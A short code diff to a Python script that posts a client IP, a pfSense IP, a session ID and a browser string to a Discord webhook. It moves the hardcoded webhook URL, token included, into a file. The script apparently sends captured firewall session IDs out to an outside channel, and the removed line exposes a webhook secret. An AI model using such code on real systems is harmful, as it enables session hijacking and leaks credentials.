@@ -1,10 +1,11 @@
 # sender_script.py
 import requests
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1560150662849892445/irbykeLjxbjVyN3sQKSL6Og_aEemKnyN94oNz9HJbZcud53nZDt_lPwDn325d7G-aGaA"
-
 def send_pfsense_id(client_ip, pfsense_ip, session_id, browser):
 
+    with open("webhook.txt", "r") as file:
+        webhook_url = file.read().strip()
+    
     ip_lst = pfsense_ip.split('.')
     team_num = ip_lst[2]
 
@@ -41,7 +42,7 @@ def send_pfsense_id(client_ip, pfsense_ip, session_id, browser):
         ]
     }
     
-    response = requests.post(WEBHOOK_URL, json=data)
+    response = requests.post(webhook_url, json=data)
     if response.status_code in (200, 204):
         print("Message delivered successfully.")
     else:
